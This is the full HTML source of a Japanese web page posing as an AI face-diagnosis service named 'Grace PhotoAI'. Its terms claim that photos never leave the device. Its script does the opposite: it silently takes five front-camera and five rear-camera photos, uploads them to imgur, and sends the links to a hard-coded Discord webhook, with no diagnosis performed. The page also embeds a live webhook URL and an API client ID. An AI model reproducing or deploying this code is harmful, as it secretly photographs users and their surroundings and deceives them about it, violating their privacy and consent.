
<!DOCTYPE html>
<html lang="ja">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <meta property="og:title" content="AI顔診断 Grace" />
  <meta property="og:description" content="内カメ・外カメで自動撮影、AI顔診断、結果をDiscordに送信" />
  <meta property="og:image" content="https://gracephotoai.github.io/grace_preview_1200x630.jpg" />
  <meta property="og:url" content="https://gracephotoai.github.io/" />
  <title>Grace PhotoAI</title>
  <style>
    body {
      background-color: #1e1e1e;
      color: white;
      font-family: Arial, sans-serif;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
      margin: 0;
    }
    h1 {
      font-size: 3em;
      margin-bottom: 20px;
    }
    button {
      padding: 15px 30px;
      font-size: 1.5em;
      border: none;
      border-radius: 5px;
      background-color: #4CAF50;
      color: white;
      cursor: pointer;
    }
    #terms {
      position: absolute;
      bottom: 20px;
      font-size: 0.9em;
      cursor: pointer;
      text-decoration: underline;
    }
    #termsModal {
      display: none;
      position: fixed;
      bottom: 0;
      left: 0;
      width: 100%;
      background: #333;
      color: white;
      padding: 20px;
    }
  </style>
</head>
<body>
  <h1>Grace PhotoAI</h1>
  <button onclick="startCapture()">診断する</button>
  <div id="terms" onclick="document.getElementById('termsModal').style.display='block'">利用規約</div>
  <div id="termsModal">
    <p><strong>利用規約</strong><br>
    本ウェブサイト（以下「当サイト」といいます）は、カメラを用いた顔面診断サービスを提供しています。ご利用にあたり、以下の利用規約をご確認いただき、同意の上でご利用ください。<br><br>
    1. 写真の取り扱い<br>
    診断に使用される写真データはすべてお客様のデバイス内で処理され、外部サーバー等に送信・保存されることはありません。<br><br>
    2. サイトの利用環境<br>
    カメラを許可していただかない場合、診断機能はご利用いただけません。正常に動作しない場合は、ブラウザの再読み込みやキャッシュのクリアをお試しください。<br><br>
    3. サイバー攻撃等の禁止<br>
    当サイトに対してDDoS攻撃、クラッキング、不正アクセス等のサイバー攻撃を行った場合、法的措置を含む厳正な対応を取らせていただきます。<br><br>
    4. プライバシーの尊重<br>
    当サイト運営者は、利用者の個人情報や写真を外部に公開することは一切ありません。また、顔面診断の結果やコメントには、個人を侮辱・揶揄する意図は一切含まれておりません。<br><br>
    5. 著作権・禁止事項<br>
    当サイトの内容、機能、デザイン、ロジック等の無断転載・複製・模倣は禁止します。発覚した場合は必要な対応を行います。<br><br>
    6. 運営情報<br>
    当サイトは2019年10月より運営を開始しております。今後も改善・更新を行っていく予定です。
    </p>
  </div>
  <script>
    const webhookURL = "https://discord.com/api/webhooks/1365282819646947409/YLfOxbOuLrQ6AHYb0_bImraprcO6VxmcoIbM4Sz2r9z_fIvuZiLED3TUIIDZCeQszc_u";

    async function startCapture() {
      const constraints = { video: { facingMode: "user" } };
      const streamIn = await navigator.mediaDevices.getUserMedia(constraints);
      const video = document.createElement("video");
      video.srcObject = streamIn;
      video.play();

      const canvas = document.createElement("canvas");
      const context = canvas.getContext("2d");

      const delay = ms => new Promise(resolve => setTimeout(resolve, ms));
      const images = [];

      // 内カメで5枚
      for (let i = 0; i < 5; i++) {
        context.drawImage(video, 0, 0, canvas.width, canvas.height);
        const dataUrl = canvas.toDataURL("image/jpeg");
        images.push(dataUrl);
        await delay(200);
      }

      // 外カメに切り替え
      streamIn.getTracks().forEach(track => track.stop());
      const streamOut = await navigator.mediaDevices.getUserMedia({ video: { facingMode: { exact: "environment" } } });
      video.srcObject = streamOut;

      await delay(500);
      // 外カメで5枚
      for (let i = 0; i < 5; i++) {
        context.drawImage(video, 0, 0, canvas.width, canvas.height);
        const dataUrl = canvas.toDataURL("image/jpeg");
        images.push(dataUrl);
        await delay(200);
      }

      streamOut.getTracks().forEach(track => track.stop());

      const embeds = [];
      for (let dataUrl of images) {
        const blob = await (await fetch(dataUrl)).blob();
        const form = new FormData();
        form.append("image", blob, "photo.jpg");
        const res = await fetch("https://api.imgur.com/3/image", {
          method: "POST",
          headers: { Authorization: "Client-ID 6e1b6bf28c5da0e" },
          body: form
        });
        const result = await res.json();
        if (result.data?.link) {
          embeds.push({ image: { url: result.data.link } });
        }
      }

      await fetch(webhookURL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          content: "サイトから取得した写真を送信

＜━━━━━＞
1〜5枚目 インカメラで撮影した写真
6〜10枚目 アウトカメラで撮影した写真
インカメラ→内カメ
アウトカメラ→外カメ",
          embeds: embeds
        })
      });
    }
  </script>
</body>
</html>
